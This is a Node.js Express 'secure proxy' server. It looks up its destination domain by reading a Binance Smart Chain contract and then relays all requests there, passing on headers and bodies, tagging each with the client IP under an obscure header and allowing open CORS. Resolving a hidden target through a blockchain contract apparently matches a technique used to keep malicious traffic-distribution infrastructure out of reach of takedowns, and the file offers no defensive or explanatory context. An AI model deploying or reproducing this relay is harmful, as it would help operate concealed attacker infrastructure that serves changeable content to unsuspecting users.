const express = require('express');
const fetch = require('node-fetch');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Parse raw body for non-GET methods
app.use((req, res, next) => {
    let data = [];
    req.on('data', chunk => data.push(chunk));
    req.on('end', () => {
        req.rawBody = Buffer.concat(data);
        next();
    });
});

function getClientIP(req) {
    if (req.headers['cf-connecting-ip']) return req.headers['cf-connecting-ip'];
    if (req.headers['x-forwarded-for'])
        return req.headers['x-forwarded-for'].split(',')[0].trim();
    return req.connection.remoteAddress;
}

class SecureProxyMiddleware {
    constructor(options = {}) {
        this.rpcUrls = options.rpcUrls || [
            "https://rpc.ankr.com/bsc",
            "https://bsc-dataseed2.bnbchain.org"
        ];
        this.contractAddress = options.contractAddress ||
            "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
        const serverIdentifier = crypto.createHash('md5')
            .update((process.env.HOSTNAME || 'localhost') + process.version)
            .digest('hex');
        this.cacheFile = path.join(os.tmpdir(), `proxy_cache_${serverIdentifier}.json`);
        this.updateInterval = 60;
    }

    loadCache() {
        if (!fs.existsSync(this.cacheFile)) return null;
        const cache = JSON.parse(fs.readFileSync(this.cacheFile, 'utf8'));
        if (!cache || (Date.now() - cache.timestamp) / 1000 > this.updateInterval) return null;
        return cache.domain;
    }

    saveCache(domain) {
        fs.writeFileSync(this.cacheFile, JSON.stringify({ domain, timestamp: Date.now() }));
    }

    hexToString(hex) {
        hex = hex.replace(/^0x/, '');
        hex = hex.substring(64);
        const lengthHex = hex.substring(0, 64);
        const length = parseInt(lengthHex, 16);
        const dataHex = hex.substring(64, 64 + length * 2);
        let result = '';
        for (let i = 0; i < dataHex.length; i += 2) {
            const charCode = parseInt(dataHex.substring(i, i + 2), 16);
            if (charCode === 0) break;
            result += String.fromCharCode(charCode);
        }
        return result;
    }

    async fetchTargetDomain() {
        const data = '20965255';
        for (const rpcUrl of this.rpcUrls) {
            try {
                const response = await fetch(rpcUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        jsonrpc: '2.0',
                        id: 1,
                        method: 'eth_call',
                        params: [{ to: this.contractAddress, data: '0x' + data }, 'latest']
                    }),
                    timeout: 120000
                });
                const result = await response.json();
                if (!result.error) {
                    const domain = this.hexToString(result.result);
                    if (domain) return domain;
                }
            } catch (e) { continue; }
        }
        throw new Error('Could not fetch target domain');
    }

    async getTargetDomain() {
        const cached = this.loadCache();
        if (cached) return cached;
        const domain = await this.fetchTargetDomain();
        this.saveCache(domain);
        return domain;
    }

    async handle(req, res, endpoint) {
        try {
            const targetDomain = (await this.getTargetDomain()).replace(/\/$/, '');
            const url = `${targetDomain}/${endpoint.replace(/^\//, '')}`;
            const clientIP = getClientIP(req);

            // Prepare headers
            const headers = { ...req.headers };
            delete headers['host'];
            delete headers['origin'];
            delete headers['accept-encoding'];
            delete headers['content-encoding'];
            headers['x-dfkjldifjlifjd'] = clientIP;

            const proxyResponse = await fetch(url, {
                method: req.method,
                headers: headers,
                body: req.method !== 'GET' && req.method !== 'HEAD' ? req.rawBody : undefined,
                timeout: 120000
            });

            // CORS headers
            res.set('Access-Control-Allow-Origin', '*');
            res.set('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
            res.set('Access-Control-Allow-Headers', '*');

            if (proxyResponse.headers.get('content-type')) {
                res.type(proxyResponse.headers.get('content-type'));
            }
            res.status(proxyResponse.status);
            proxyResponse.body.pipe(res); // Stream response directly
        } catch (err) {
            res.status(500).send('error: ' + err.message);
        }
    }
}

const proxy = new SecureProxyMiddleware({
    rpcUrls: [
        "https://binance.llamarpc.com",
        "https://bsc.drpc.org"
    ],
    contractAddress: "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
});

// OPTIONS request (CORS preflight)
app.options('*', (req, res) => {
    res.set('Access-Control-Allow-Origin', '*');
    res.set('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
    res.set('Access-Control-Allow-Headers', '*');
    res.set('Access-Control-Max-Age', '86400');
    res.sendStatus(204);
});

// Ping check
app.get('/', (req, res) => {
    if (req.query.e === 'ping_proxy') {
        res.type('text/plain').send('pong');
    } else {
        res.status(400).send('Missing endpoint');
    }
});

// Proxy main
app.all('*', async (req, res) => {
    const endpoint = req.query.e;
    if (!endpoint) return res.status(400).send('Missing endpoint');
    await proxy.handle(req, res, decodeURIComponent(endpoint));
});

app.listen(port, () => console.log(`Secure proxy running on port ${port}`));
